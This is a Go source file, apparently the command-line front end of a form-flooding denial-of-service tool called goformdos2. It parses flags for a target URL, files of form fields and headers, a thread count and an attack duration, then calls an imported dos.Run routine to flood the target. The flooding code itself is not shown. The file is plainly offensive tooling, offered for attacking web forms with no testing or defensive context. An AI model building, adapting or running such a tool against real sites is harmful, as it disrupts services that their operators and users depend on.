// Author: PiereLucas

package main

import (
	"bufio"
	"flag"
	"fmt"
	"log"
	"net/url"
	"os"
	"strings"

	"github.com/pierelucas/goformdos2/dos"
)

var (
	flagForms = flag.String(
		"f",
		"",
		"File containing form names")
	flagHeaders = flag.String(
		"h",
		"",
		"File containing headers")
	flagURL = flag.String(
		"u",
		"",
		"Target url")
	flagThreads = flag.Int(
		"r",
		0,
		"Define how many routines should running")
	flagTime = flag.Int(
		"t",
		0,
		"Define dos duration (seconds)")
	flagLog = flag.String(
		"l",
		"",
		"logfile")
)

var (
	info dos.TargetInf
)

func appendFileToStruct(mode string, filename string, sync chan<- string) {
	f, err := os.Open(filename)
	if err != nil {
		sync <- fmt.Sprintf("error opening file: %s\n", filename)
	}

	defer func() {
		if err = f.Close(); err != nil {
			sync <- fmt.Sprintf("error closing file: %s\n", filename)
		}
	}()

	s := bufio.NewScanner(f)
	var stripped []string
	for s.Scan() {
		stripped = strings.Split(s.Text(), ":")         // split line on :
		stripped[0] = strings.Trim(stripped[0], "\r\n") // strip carriage return and newline
		stripped[1] = strings.Trim(stripped[1], "\r\n")
		if mode == "FORMS" {
			info.AddForm(stripped[0], stripped[1]) // add form and form value to struct
		} else if mode == "HEADERS" {
			info.AddHeader(stripped[0], stripped[1]) // add header and header value to struct
		} else {
			log.Fatalln("error in func appendFileToStruct - wrong mode! [FORMS / HEADERS]")
		}
		stripped = nil // clear the slice
	}

	if err = s.Err(); err != nil {
		sync <- fmt.Sprintf("%s\n", err)
	}

	sync <- ""
}

func validateURL(s string, sync chan<- struct{}) {
	_, err := url.ParseRequestURI(s)
	if err != nil {
		log.Fatalf("%s is invalid url\n", s)
	}
	close(sync)
}

func isPath(filepath string) (bool, error) {
	_, err := os.Stat(filepath)
	if err != nil {
		return false, err
	}
	return true, err
}

func init() {
	fmt.Print("\033[H\033[2J") // clear terminal
	flag.Parse()
	if *flagForms == "" || *flagURL == "" || *flagHeaders == "" || *flagThreads <= 0 || *flagTime <= 0 {
		log.Fatalln("please define arguments or use -h for help")
	}
	if *flagLog != "" {
		b, _ := isPath(*flagLog)
		if b {
			file, err := os.OpenFile(*flagLog, os.O_CREATE|os.O_APPEND|os.O_WRONLY, 0644)
			if err != nil {
				log.Fatalln(err)
			}

			defer file.Close()

			log.SetOutput(file)
		} else {
			log.Fatalf("%s path not exist - unable to open or create file", *flagLog)
		}
	}
}

func main() {

	urlsync := make(chan struct{})
	appendsync := make(chan string)

	var appenderr string

	go appendFileToStruct("FORMS", *flagForms, appendsync)
	go appendFileToStruct("HEADERS", *flagHeaders, appendsync)
	go validateURL(*flagURL, urlsync)

	<-urlsync                // wait for validateURL()
	appenderr = <-appendsync // wait for file append
	if appenderr != "" {
		log.Fatalln(appenderr)
	}

	appenderr = <-appendsync // wait for file append
	if appenderr != "" {
		log.Fatalln(appenderr)
	}

	info.AddWebaddress(*flagURL) // add url to struct

	err := dos.Run(*flagThreads, *flagTime, info)
	if err != nil {
		log.Fatalln(err)
	}
}
